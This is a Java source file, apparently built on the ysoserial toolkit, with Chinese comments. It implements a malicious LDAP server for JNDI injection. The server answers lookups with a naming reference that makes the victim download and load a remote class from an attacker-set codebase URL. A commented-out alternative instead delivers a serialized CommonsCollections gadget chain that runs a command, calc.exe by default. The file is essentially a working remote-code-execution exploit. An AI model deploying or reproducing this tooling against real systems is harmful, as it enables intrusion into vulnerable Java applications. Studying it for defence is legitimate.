package com.ysoserial;

import java.io.*;
import java.net.*;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;


import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import ysoserial.payloads.*;

public class LdapServerMain {
    /*
     * 自己定义 getObject
     * 或者调用 ysoserial 自带的 payload， 如下
     */
    @SuppressWarnings("unchecked")
    private static Object getObject(String cmd) throws Exception {
//        CommonsCollections1 commonsCollections1 = new CommonsCollections1();
//        CommonsCollections2 commonsCollections2 = new CommonsCollections2();
//        CommonsCollections3 commonsCollections3 = new CommonsCollections3();
        CommonsCollections4 commonsCollections4 = new CommonsCollections4();

//        CommonsCollections5 commonsCollections5 = new CommonsCollections5();
//        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
//        CommonsCollections7 commonsCollections7 = new CommonsCollections7();

        return commonsCollections4.getObject(cmd);


    }

    /*
     * com.sun.jndi.ldap.Obj.serializeObject
     */
    private static byte[] serializeObject(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        String cmd;

        //自定义 codebase ，格式如下。
        private URL codebase  = new URL("http://0.0.0.0:8000/#Exploit234");

        OperationInterceptor(String cmd) throws MalformedURLException {
            this.cmd = cmd;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        //使用 ldap 中 javaSerializedData 方式。
//        void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
//
//            e.addAttribute("javaClassName", "foo");
//            e.addAttribute("javaSerializedData", serializeObject(getObject(this.cmd)));
//            result.sendSearchEntry(e);
//            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
//        }

        //使用 ldap + Reference 方式。
        void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            URL url = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + url);
            //任意给定即可
            e.addAttribute("javaClassName", "foo");
            //提取 远程下载地址
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static void MiniLDAPServer(String addr, int port, String cmd) throws Exception {
        InMemoryDirectoryServerConfig conf = new InMemoryDirectoryServerConfig("a=b");
        conf.setListenerConfigs
            (
                new InMemoryListenerConfig
                    (
                        "listen",
                        InetAddress.getByName(addr),
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()
                    )
            );
        conf.addInMemoryOperationInterceptor(new OperationInterceptor(cmd));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(conf);
        ds.startListening();
    }

    public static void main(String[] argv) {
        if (argv.length > 3) {
            System.out.println("***Usage: java -cp ysoserial.LdapServerMain [host] [port] [cmd]");
        }
        try {
            String address = "0.0.0.0";
            int port = Integer.parseInt("8888");
            String cmd = "calc.exe";
            MiniLDAPServer(address, port, cmd);
            System.out.println("***启动Ldap服务器成功***");
            System.out.println("Listening address = " + address);
            System.out.println("Listening port = " + port);
            System.out.println("ldap 访问url = ldap://" + address + ":" + port + "/a=b");
        } catch (Exception error) {
            System.out.println("***启动Ldap服务器失败***");
            error.printStackTrace();
        }
    }
}
